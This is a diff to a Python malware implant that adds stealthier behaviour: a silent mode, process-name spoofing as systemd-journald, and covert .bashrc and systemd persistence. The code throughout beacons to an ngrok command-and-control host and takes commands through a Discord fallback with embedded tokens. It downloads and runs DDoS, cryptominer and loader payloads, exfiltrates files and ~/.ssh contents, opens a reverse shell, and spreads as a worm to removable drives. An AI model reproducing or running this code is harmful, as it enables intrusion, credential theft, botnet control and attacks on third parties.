@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import socket, subprocess, base64, time, urllib.request, os, threading
+import socket, subprocess, base64, time, urllib.request, os, threading, sys
 from Cryptodome.Cipher import AES
 import zipfile, tempfile, shutil, json
 import urllib.parse
@@ -9,8 +9,8 @@ import hashlib
 # === Config ===
 SECRET_KEY = b'6767BabyROGUE!&%5'
 EXFIL_KEY = b'magicRogueSEE!333'
-C2_HOST = 'inadvertent-homographical-method.ngrok-tree.dev'  # No port in hostname
-C2_PORT = 4444  # ngrok uses port 443
+C2_HOST = 'inadvertent-homographical-method.ngrok-tree.dev'
+C2_PORT = 4444
 EXFIL_PORT = 9091
 PAYLOAD_REPO = "https://inadvertent-homographical-method.ngrok-tree.dev/payloads/"
 HIDDEN_DIR = os.path.expanduser("~/.cache/.rogue")
@@ -18,7 +18,6 @@ os.makedirs(HIDDEN_DIR, exist_ok=True)
 
 # Implant unique identifier
 IMPLANT_ID = f"{os.uname().nodename}_{os.getlogin()}_{os.getpid()}"
-# Create consistent ID hash
 IMPLANT_ID_HASH = hashlib.md5(IMPLANT_ID.encode()).hexdigest()[:8]
 
 # === Discord Fallback (Optional) ===
@@ -26,10 +25,36 @@ DISCORD_COMMAND_URL = "https://discord.com/api/v10/channels/13243520099283764626
 DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/138892227736354441388/rVwymNWwbqkXxxhhHU76KUcM3Pa0BZ01hzY0rts14EoI15GW21rRgEEaqH82FhJE"
 BOT_TOKEN = "MTM4ODk4Mmnru^&676hhbzOTkyNTQ5OA.G7d-oM.T2IM_m_GcgH5z76GBFuuc53782jdhfdiI8GeS8U"
 
-# Create a custom SSL context to handle ngrok certificates
+# SSL context for ngrok
 ssl_context = ssl.create_default_context()
 ssl_context.check_hostname = False
 ssl_context.verify_mode = ssl.CERT_NONE
+
+# === ENHANCED SILENT MODE ===
+def should_run_silently():
+    """Check if we should run in silent mode - ONLY from persistence"""
+    if os.environ.get('ROGUE_LAUNCHED') == '1':
+        return True
+    try:
+        ppid = os.getppid()
+        with open(f'/proc/{ppid}/cmdline', 'rb') as f:
+            cmdline = f.read().decode('utf-8', errors='ignore').lower()
+            if 'bash' in cmdline and ('rc' in cmdline or 'profile' in cmdline):
+                return True
+    except:
+        pass
+    return False
+
+def redirect_output_to_log():
+    """Redirect all output to log file for silent operation"""
+    log_file = os.path.join(HIDDEN_DIR, ".implant.log")
+    try:
+        log_fd = open(log_file, 'a')
+        sys.stdout = log_fd
+        sys.stderr = log_fd
+        return True
+    except Exception as e:
+        return False
 
 def encrypt_response(msg):
     cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
@@ -43,7 +68,7 @@ def decrypt_command(data):
     return cipher.decrypt_and_verify(ciphertext, tag).decode()
 
 def send_https_command(cmd):
-    """Send command over HTTPS to C2"""
+    """Send command over HTTPS to C2 - WITH DEBUG OUTPUT"""
     url = f"https://{C2_HOST}/"
     encrypted_cmd = encrypt_response(cmd)
     
@@ -71,14 +96,11 @@ def send_https_command(cmd):
         return error_msg
 
 def fetch_payload(name):
-    """Fetch payload from C2 server"""
+    """Fetch payload from C2 server - WITH DEBUG"""
     url = f"{PAYLOAD_REPO}{name}"
     dest = os.path.join(HIDDEN_DIR, name)
     
     try:
-        print(f"[*] Fetching payload: {name} from {url}")
-        
-        # Create request with proper headers and SSL context
         req = urllib.request.Request(
             url,
             headers={
@@ -87,29 +109,25 @@ def fetch_payload(name):
             }
         )
         
-        # Download the file with SSL context
         response = urllib.request.urlopen(req, context=ssl_context, timeout=30)
         
-        # Write the file
         with open(dest, 'wb') as f:
             f.write(response.read())
         
-        # Make it executable if it's a Python script
         if name.endswith('.py'):
             os.chmod(dest, 0o755)
-            print(f"[+] Python payload saved and made executable: {dest}")
-        else:
-            print(f"[+] Payload saved: {dest}")
         
+        print(f"[+] Fetched payload: {name}")
         return dest
         
     except Exception as e:
-        print(f"[!] Failed to fetch payload {name}: {e}")
+        print(f"[!] Failed to fetch {name}: {e}")
         return None
 
 def run_payload(name):
     path = os.path.join(HIDDEN_DIR, name)
     if os.path.exists(path):
+        print(f"[+] Running payload: {name}")
         return subprocess.getoutput(f"python3 {path}")
     return f"[!] Payload {name} not found."
 
@@ -158,8 +176,10 @@ def exfiltrate_data(path):
         s.connect((host, EXFIL_PORT))
         s.sendall(encrypted_blob)
         s.close()
+        print(f"[+] Exfiltration successful: {path}")
         return f"[+] Exfiltrated encrypted archive from: {path}"
     except Exception as e:
+        print(f"[!] Exfiltration failed: {e}")
         return f"[!] Exfiltration failed: {e}"
 
 def reverse_shell():
@@ -175,33 +195,34 @@ def reverse_shell():
             output = subprocess.getoutput(cmd)
             s.send(output.encode())
         s.close()
-    except:
-        pass
+    except Exception as e:
+        print(f"[!] Reverse shell failed: {e}")
 
 def handle_trigger(cmd):
     if cmd.startswith("trigger_ddos"):
-        # Download ddos.py first
         fetch_payload("ddos.py")
         path = os.path.join(HIDDEN_DIR, "ddos.py")
         args = " ".join(cmd.split()[1:])
         if os.path.exists(path):
+            print(f"[+] Starting DDoS attack with args: {args}")
             return subprocess.getoutput(f"python3 {path} {args}")
         return "[!] ddos.py not found after download"
 
     elif cmd == "trigger_mine":
-        # Download mine.py first
         fetch_payload("mine.py")
+        print("[+] Starting crypto miner")
         return run_payload("mine.py")
 
     elif cmd == "trigger_stopmine":
+        print("[+] Stopping crypto miner")
         return subprocess.getoutput("pgrep -f mine.py && pkill -f mine.py || echo '[-] No miner running.'")
 
     elif cmd.startswith("trigger_exfil"):
-        # Extract path from command
         parts = cmd.split()
         if len(parts) < 2:
             return "[!] Usage: trigger_exfil <path>"
         path = parts[1]
+        print(f"[+] Starting exfiltration of: {path}")
         return exfiltrate_data(path)
 
     elif cmd == "trigger_dumpcreds":
@@ -212,9 +233,9 @@ def handle_trigger(cmd):
             os.path.expanduser("~/Desktop"),
             os.path.expanduser("~/.ssh"),
         ]
-        # Filter out non-existent directories
         existing_targets = [t for t in targets if os.path.exists(t)]
         if existing_targets:
+            print(f"[+] Dumping credentials from {len(existing_targets)} locations")
             return exfiltrate_data(existing_targets)
         return "[!] No target directories found"
 
@@ -223,6 +244,7 @@ def handle_trigger(cmd):
         if not os.path.exists(path):
             fetch_payload("polyloader.py")
         if os.path.exists(path):
+            print("[+] Executing polyloader.py")
             return subprocess.getoutput(f"python3 {path}")
         return "[!] polyloader.py not found"
 
@@ -248,17 +270,21 @@ def handle_command(cmd):
         return result if result else "[!] Trigger failed"
     
     elif cmd == "reverse_shell":
+        print("[+] Starting reverse shell thread")
         threading.Thread(target=reverse_shell).start()
         return "[*] Reverse shell started"
     
     else:
-        # Default command execution
+        print(f"[+] Executing command: {cmd}")
         return subprocess.getoutput(cmd)
 
 def beacon():
-    """Main beacon loop using HTTPS"""
-    print(f"[+] Starting HTTPS beacon to {C2_HOST}")
-    print(f"[+] Implant ID: {IMPLANT_ID_HASH}")
+    """Main beacon loop using HTTPS - WITH VISIBLE OUTPUT WHEN MANUAL"""
+    silent_mode = should_run_silently()
+    
+    if not silent_mode:
+        print(f"[+] Starting HTTPS beacon to {C2_HOST}")
+        print(f"[+] Implant ID: {IMPLANT_ID_HASH}")
     
     beacon_count = 0
     identified = False
@@ -267,42 +293,45 @@ def beacon():
     while True:
         try:
             beacon_count += 1
-            print(f"\n[BEACON #{beacon_count}] Checking in...")
             
-            # Send beacon and check for commands
+            if not silent_mode:
+                print(f"[BEACON #{beacon_count}] Checking in...")
+            
             response = send_https_command("beacon")
-            print(f"[BEACON #{beacon_count}] Response: {response[:50]}...")
             
-            # Check if response is a command to execute
+            if not silent_mode:
+                print(f"[BEACON #{beacon_count}] Response: {response[:50]}...")
+            
             if response and response != "pong":
                 if response.startswith("identified:"):
                     bot_id = response.replace("identified:", "", 1)
-                    print(f"[+] C2 identified us as: {bot_id}")
                     identified = True
+                    if not silent_mode:
+                        print(f"[+] C2 identified us as: {bot_id}")
                 else:
-                    print(f"[+] Received command: {response}")
+                    if not silent_mode:
+                        print(f"[+] Received command: {response}")
                     result = handle_command(response)
-                    result_preview = result[:100] + "..." if len(result) > 100 else result
-                    print(f"[+] Command result: {result_preview}")
+                    if not silent_mode:
+                        result_preview = result[:100] + "..." if len(result) > 100 else result
+                        print(f"[+] Command result: {result_preview}")
                     
-                    # Send result back
                     if result:
-                        print(f"[+] Sending result to C2...")
-                        result_response = send_https_command(f"result:{result}")
-                        print(f"[+] C2 acknowledged: {result_response}")
+                        send_https_command(f"result:{result}")
             
-            # If first beacon, send identification
             if not identified and beacon_count == 1:
-                print(f"[+] Sending identification to C2...")
-                id_response = send_https_command(f"identify:{IMPLANT_ID_HASH}")
-                print(f"[+] C2 response: {id_response}")
+                if not silent_mode:
+                    print(f"[+] Sending identification to C2...")
+                send_https_command(f"identify:{IMPLANT_ID_HASH}")
             
-            print(f"[.] Next beacon in 30 seconds...")
-            time.sleep(30)  # Beacon interval
+            if not silent_mode:
+                print(f"[.] Next beacon in 30 seconds...")
+            time.sleep(30)
             
         except Exception as e:
-            print(f"[!] Beacon error: {e}")
-            print(f"[!] Retrying in 60 seconds...")
+            if not silent_mode:
+                print(f"[!] Beacon error: {e}")
+                print(f"[!] Retrying in 60 seconds...")
             time.sleep(60)
 
 def check_discord_command():
@@ -314,6 +343,7 @@ def check_discord_command():
         latest = json.loads(response)[0]["content"]
         return latest
     except Exception as e:
+        print(f"[!] Discord command check failed: {e}")
         return None
 
 def send_to_webhook(content):
@@ -326,25 +356,31 @@ def send_to_webhook(content):
             method='POST'
         )
         urllib.request.urlopen(req)
-    except:
-        pass
+    except Exception as e:
+        print(f"[!] Discord webhook send failed: {e}")
 
 def discord_loop():
     """Discord fallback command loop"""
-    print("[+] Discord beacon active")
+    silent_mode = should_run_silently()
+    
+    if not silent_mode:
+        print("[+] Discord beacon active")
+    
     last_cmd = ""
     
     while True:
         try:
             cmd = check_discord_command()
             if cmd and cmd != last_cmd:
-                print(f"[Discord] Received command: {cmd}")
+                if not silent_mode:
+                    print(f"[Discord] Received command: {cmd}")
                 result = handle_command(cmd)
                 encrypted_result = encrypt_response(result).decode()
                 send_to_webhook(encrypted_result)
                 last_cmd = cmd
         except Exception as e:
-            pass
+            if not silent_mode:
+                print(f"[!] Discord loop error: {e}")
         
         time.sleep(30)
 
@@ -353,23 +389,68 @@ def fake_name():
     try:
         import setproctitle
         setproctitle.setproctitle("systemd-journald")
+        print("[+] Process name changed to systemd-journald")
     except:
         pass
 
 def setup_persistence():
-    """Set up persistence via .bashrc"""
+    """Set up stealthy persistence"""
     target = os.path.join(HIDDEN_DIR, ".rogue_agent.py")
+    
     if not os.path.exists(target):
         shutil.copy(__file__, target)
-        with open(os.path.expanduser("~/.bashrc"), "a") as f:
-            f.write(f"\n# System maintenance\n(sleep 10 && python3 {target} 2>/dev/null &) &\n")
-        os.chmod(target, 0o700)
-        print(f"[+] Persistence installed: {target}")
+        
+        persistence_script = f'''if [ -z "${{ROGUE_LAUNCHED+x}}" ]; then
+    export ROGUE_LAUNCHED=1
+    (cd {HIDDEN_DIR} && nohup python3 {target} >/dev/null 2>&1 &)
+fi'''
+        
+        bashrc_path = os.path.expanduser("~/.bashrc")
+        if os.path.exists(bashrc_path):
+            with open(bashrc_path, 'a') as f:
+                f.write(f"\n# System journal service\n{persistence_script}\n")
+            print(f"[+] Persistence installed to .bashrc")
+        
+        return True
+    return False
+
+def create_systemd_service(target_path):
+    """Create a systemd service file for more robust persistence"""
+    service_content = f"""[Unit]
+Description=System Journal Service
+After=network.target
+
+[Service]
+Type=simple
+User={os.getlogin()}
+WorkingDirectory={HIDDEN_DIR}
+ExecStart=/usr/bin/python3 {target_path}
+Restart=always
+RestartSec=60
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
+"""
+    
+    service_file = os.path.join(HIDDEN_DIR, "systemd-journald.service")
+    with open(service_file, 'w') as f:
+        f.write(service_content)
+    
+    install_script = os.path.join(HIDDEN_DIR, "install_service.sh")
+    with open(install_script, 'w') as f:
+        f.write(f"""#!/bin/bash
+sudo cp {service_file} /etc/systemd/system/systemd-journald.service
+sudo systemctl daemon-reload
+sudo systemctl enable --now systemd-journald
+""")
+    os.chmod(install_script, 0o755)
+    print(f"[+] Systemd service created: {service_file}")
 
 def worm_propagate():
     """Worm propagation to removable drives"""
     try:
-        # For Linux
         drives = subprocess.getoutput("lsblk -o MOUNTPOINT -nr | grep -v '^$'").splitlines()
         for mount in drives:
             if "/media" in mount or "/run/media" in mount:
@@ -378,12 +459,12 @@ def worm_propagate():
                     os.makedirs(worm_dir, exist_ok=True)
                     shutil.copy(__file__, os.path.join(worm_dir, "rogue_implant.py"))
                     with open(os.path.join(worm_dir, ".bash_login"), "w") as f:
-                        f.write(f"python3 .rogue_worm/rogue_implant.py &\n")
+                        f.write(f"if [ -z \"${{ROGUE_WORM_LAUNCHED+x}}\" ]; then export ROGUE_WORM_LAUNCHED=1; (cd {worm_dir} && nohup python3 rogue_implant.py >/dev/null 2>&1 &); fi\n")
                     print(f"[+] Worm propagated to: {worm_dir}")
-                except:
-                    pass
-    except:
-        pass
+                except Exception as e:
+                    print(f"[!] Worm propagation failed for {mount}: {e}")
+    except Exception as e:
+        print(f"[!] Worm propagation failed: {e}")
 
 def p2p_listener():
     """P2P listener for bot communication"""
@@ -394,13 +475,14 @@ def p2p_listener():
     for port in backup_ports:
         try:
             sock.bind(('0.0.0.0', port))
-            print(f"[♥] P2P listener bound to port {port}")
             bound = True
+            print(f"[+] P2P listener bound to port {port}")
             break
         except OSError:
             continue
 
     if not bound:
+        print("[!] P2P listener failed to bind")
         return
 
     while True:
@@ -408,6 +490,7 @@ def p2p_listener():
             data, addr = sock.recvfrom(1024)
             if data.decode() == "Rogue?":
                 sock.sendto(b"I'm Rogue", addr)
+                print(f"[P2P] Responded to query from {addr}")
         except:
             break
 
@@ -425,24 +508,56 @@ def p2p_broadcast():
                 continue
         time.sleep(60)
 
-# === Launch ===
-if __name__ == "__main__":
-    print("[+] Rogue Implant starting...")
-    print(f"[+] C2 Target: {C2_HOST}:{C2_PORT}")
-    print(f"[+] Payload Repo: {PAYLOAD_REPO}")
-    print(f"[+] Implant ID: {IMPLANT_ID_HASH}")
+def cleanup_old_persistence():
+    """Remove old aggressive persistence from .bashrc"""
+    rc_files = ['.bashrc', '.profile', '.bash_profile']
+    for rc_file in rc_files:
+        rc_path = os.path.expanduser(f"~/{rc_file}")
+        if os.path.exists(rc_path):
+            with open(rc_path, 'r') as f:
+                lines = f.readlines()
+            
+            new_lines = [line for line in lines if 'rogue_agent.py' not in line and 'System maintenance' not in line]
+            
+            if len(new_lines) != len(lines):
+                with open(rc_path, 'w') as f:
+                    f.writelines(new_lines)
+                print(f"[+] Cleaned old persistence from {rc_file}")
+
+# === Main Function ===
+def main():
+    """Main entry point with smart silent mode"""
+    silent_mode = should_run_silently()
     
-    # Stealth and persistence
+    cleanup_old_persistence()
+    
+    if silent_mode:
+        print(f"[+] Rogue Implant starting in silent mode...")
+        redirect_output_to_log()
+    else:
+        print("[+] Rogue Implant starting...")
+        print(f"[+] C2 Target: {C2_HOST}:{C2_PORT}")
+        print(f"[+] Payload Repo: {PAYLOAD_REPO}")
+        print(f"[+] Implant ID: {IMPLANT_ID_HASH}")
+    
+    if silent_mode and os.isatty(0):
+        pid = os.fork()
+        if pid > 0:
+            sys.exit(0)
+    
     fake_name()
     setup_persistence()
     worm_propagate()
     
-    # Start threads
     threading.Thread(target=p2p_listener, daemon=True).start()
     threading.Thread(target=p2p_broadcast, daemon=True).start()
     threading.Thread(target=discord_loop, daemon=True).start()
     
-    print("[+] All systems operational. Starting beacon...")
+    if not silent_mode:
+        print("[+] All systems operational. Starting beacon...")
     
-    # Start main HTTPS beacon (this will run in main thread)
     beacon()
+
+# === Launch ===
+if __name__ == "__main__":
+    main()
